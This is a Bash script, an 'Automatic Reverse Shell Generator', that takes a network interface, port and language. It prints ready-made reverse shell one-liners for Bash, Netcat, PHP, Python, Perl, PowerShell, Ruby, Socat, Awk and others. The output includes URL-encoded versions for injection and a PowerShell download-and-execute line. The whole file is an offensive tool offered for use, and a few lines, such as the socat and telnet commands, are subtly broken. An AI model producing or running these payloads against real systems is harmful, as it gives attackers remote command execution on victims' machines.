#!/bin/bash

#colors
declare -r White="\e[97m"
declare -r RedLight="\e[91m"
declare -r GreenLight="\e[92m"
declare -r YellowLight="\e[93m"
declare -r CyanLight="\e[96m"
declare -r End="\e[0m"

#var
declare -r f1='['
declare -r f2=']'
declare -r f3='i'
declare -r f4='<'
declare -r f5='>'
declare -r f6='+'
declare -r f7='/'
declare -r f8='|'
declare -r f9='language'
declare -r f10='interface'
declare -r f11='lport'
declare -r f12='Bash'
declare -r f13='Netcat'
declare -r f14='Python'
declare -r f15='Python3'
declare -r f16='Ncat'
declare -r f17='Ruby'
declare -r f18='PowerShell'
declare -r f19='Perl'
declare -r f20='Socat'
declare -r f21='Telnet'
declare -r f22='Php'
declare -r f23='Awk'
declare -r f24='Xterm'
declare -r f25='Gawk'
declare -r f26='==============================================================='
declare -r f27=''
declare -r f28=''
declare -r f29='Automatic Reverse Shell Generator'
declare -r int="$1"
declare -r lp="$2"
declare -r def="$3"
declare -r lh=$(ip -4 address show $int | grep 'inet' | awk '{print $2}' | cut -d/ -f 1)

function banner(){
	echo ""	
	echo -e "$White$f26                                            $End";	
	echo -e "$CyanLight   _________.__           .__  .__          $End";
	echo -e "$CyanLight  /   _____/|  |__   ____ |  | |  | ___.__. $End";
	echo -e "$CyanLight  \_____  \ |  |  \_/ __ \|  | |  |<   |  | $End";
	echo -e "$CyanLight  /        \|   Y  \  ___/|  |_|  |_\___  | $End";
	echo -e "$CyanLight /_______  /|___|  /\___  >____/____/ ____| $End";
	echo -e "$CyanLight         \/      \/     \/          \/      $End";
	echo -e "$GreenLight     $f29                                  $End";
	echo -e "$White$f26                                            $End";
}

function main(){
	echo ""
	echo -e "$White$f1$RedLight$f6$White$f2$GreenLight Author:$RedLight   d4t4s3c$End"
   	echo -e "$White$f1$YellowLight$f3$White$f2$GreenLight Example:$YellowLight  Shelly $White$f4$RedLight$f10$White$f5 $White$f4$RedLight$f11$White$f5$End $White$f4$RedLight$f9$White$f5$End"
    	echo ""
}

if [ ! -z $int ]; then
	sleep 0.5
else
	banner
    	main
    	exit 0
fi

if [ ! -z $lp ]; then
    	sleep 0.5
else
	banner
    	main
    	exit 0
fi

if [ ! -z $def ]; then
    	sleep 0.5
else
	banner
    	main
    	exit 0
fi

function bash(){
	echo ""
	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f12$End"
	echo ""
	echo -e "\tbash -i >& /dev/tcp/$lh/$lp 0>&1"
	echo ""
	echo -e "\tbash -c 'bash -i >& /dev/tcp/$lh/$lp 0>&1'"
	echo ""
	echo -e "\tbash -l > /dev/tcp/$lh/$lp 0<&1 2>&1"
	echo ""
	echo -e "\tbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$lh%2F$lp%200%3E%261%22"
	echo ""	
}

function netcat(){
	echo ""
	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f13$End"
	echo ""
	echo -e "\tnc -e /bin/sh $lh $lp"
	echo ""
	echo -e "\tnc -e /bin/bash $lh $lp"
	echo ""
	echo -e "\tnc -c /bin/sh $lh $lp"
	echo ""
	echo -e "\tnc -c /bin/bash $lh $lp"
	echo ""
	echo -e "\tnc.exe -e cmd $lh $lp"
	echo
	echo -e "\trm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lh $lp >/tmp/f"
	echo ""
	echo -e "\trm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20$lh%20$lp%20%3E%2Ftmp%2Ff"
	echo ""
}

function php(){
	echo ""
	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f22$End"
	echo ""
	echo -e "\tphp -r '\$sock=fsockopen("$lh",$lp);exec("/bin/sh -i \<\&3 \>\&3 2\>\&3");'"
	echo ""
	echo -e "\tphp -r '\$s=fsockopen("$lh",$lp);shell_exec("/bin/sh -i \<\&3 \>\&3 2\>\&3");'"
	echo ""
	echo -e "\tphp -r '\$s=fsockopen("$lh",$lp);system("/bin/sh -i \<\&3 \>\&3 2\>\&3");'"
	echo ""
	echo -e "\tphp -r '\$s=fsockopen("$lh",$lp);popen("/bin/sh -i \<\&3 \>\&3 2\>\&3", "r");'"
	echo ""
	echo -e "\tphp -r '\$sock=fsockopen("$lh",$lp); $proc = proc_open("/bin/sh -i", array(0=>\$sock, 1=>\$sock, 2=>\$sock), \$pipes);'"
	echo ""
}

function ncat(){
	echo ""
	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f16$End"
	echo ""
	echo -e "\tncat $lh $lp -e /bin/sh"
	echo ""
}


function xterm(){
	echo ""
	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f24$End"
	echo ""
	echo -e "\txterm -display $lh:$lp"
	echo ""
}

function python(){
	echo ""
    	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f14$End"
    	echo ""
    	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
    	echo ""
    	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'"
    	echo ""
    	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f15$End"
    	echo ""
    	echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
    	echo ""
    	echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'"
    	echo ""
}

function perl(){
	echo ""
	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f19$End"
	echo ""
	echo "perl -e 'use Socket;\$i="\$lh";\$p=\$lp;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,"\>\&S");open(STDOUT,"\>\&S");open(STDERR,"\>\&S");exec("/bin/sh -i");};'"
	echo ""
	echo "perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,"$lh:$lp");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'"
	echo ""

}

function telnet(){
	echo ""
	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f21$End"
	echo ""
	echo -e "\trm -f /tmp/p; mknod /tmp/p p && telnet $lh $lp 0/tmp/p"
	echo ""
	echo -e "\trm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet $lh $lp > /tmp/f"
	echo ""
}

function powershell(){
	echo ""
	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f18$End"
	echo ""
	echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("$lh",$lp);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + "PS " + (pwd).Path + "\> ";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
	echo ""
	echo "powershell -nop -c '\$client = New-Object System.Net.Sockets.TCPClient("$lh",$lp);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()'"
	echo ""
	echo "powershell IEX (New-Object Net.WebClient).DownloadString('http://$lh:$lp/reverse.ps1')"
	echo ""
}

function awk(){
	echo ""
	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f23$End"
	echo ""
	echo "awk 'BEGIN {s = '/inet/tcp/0/$lh/$lp'; while(42) { do{ printf 'shell>' |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != 'exit') close(s); }}' /dev/null"
	echo ""
}

function gawk(){
	echo ""
	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f25$End"
	echo ""
	echo "gawk 'BEGIN {P=$lp;S="\> ";H="$lh";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'"
	echo ""
}

function socat(){
	echo ""
	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f20$End"
	echo ""
	echo -e "\tsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lh:$lh,forever &"
	echo ""
}

function ruby(){
	echo ""
	echo -e "$White$f1$RedLight$f6$White$f2 $GreenLight$f17$End"
	echo ""
	echo -e "\truby -rsocket -e 'exit if fork;c=TCPSocket.new("$lh","$lp");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'"
	echo ""
	echo -e "\truby -rsocket -e'f=TCPSocket.open("$lh",$lp).to_i;exec sprintf("/bin/sh -i \<\&%d \>\&%d 2\>\&%d",f,f,f)'"
}

function start(){
		echo ""
		echo -e "$White$f26$End"
	if [ "$def" == "bash" ] || [ "$def" == "Bash" ]; then
		bash
		echo ""
		echo -e "$White$f26$End"
	elif [ "$def" == "netcat" ] || [ "$def" == "Netcat" ]; then
		netcat
		echo ""
		echo -e "$White$f26$End"
	elif [ "$def" == "php" ] || [ "$def" == "Php" ]; then
		php
		echo ""
		echo -e "$White$f26$End"
	elif [ "$def" == "ncat" ] || [ "$def" == "Ncat" ]; then
		ncat
		echo ""
		echo -e "$White$f26$End"
	elif [ "$def" == "python" ] || [ "$def" == "Python" ]; then
		python
		echo ""
		echo -e "$White$f26$End"
	elif [ "$def" == "perl" ] || [ "$def" == "Perl" ]; then
		perl
		echo ""
		echo -e "$White$f26$End"
	elif [ "$def" == "telnet" ] || [ "$def" == "Telnet" ]; then
		telnet
		echo ""
		echo -e "$White$f26$End"
	elif [ "$def" == "powershell" ] || [ "$def" == "PowerShell" ]; then
		powershell
		echo ""
		echo -e "$White$f26$End"
	elif [ "$def" == "awk" ] || [ "$def" == "Awk" ]; then
		awk
		echo ""
		echo -e "$White$f26$End"
	elif [ "$def" == "gawk" ] || [ "$def" == "Gawk" ]; then
		gawk
		echo ""
		echo -e "$White$f26$End"
	elif [ "$def" == "socat" ] || [ "$def" == "Socat" ]; then
		socat
		echo ""
		echo -e "$White$f26$End"
	elif [ "$def" == "ruby" ] || [ "$def" == "Ruby" ]; then
		ruby
		echo ""
		echo -e "$White$f26$End"
	elif [ "$def" == "xterm" ] || [ "$def" == "Xterm" ]; then
		xterm
		echo ""
		echo -e "$White$f26$End"
    	else
 		banner
    		main
    		exit 0
    	fi
}

start
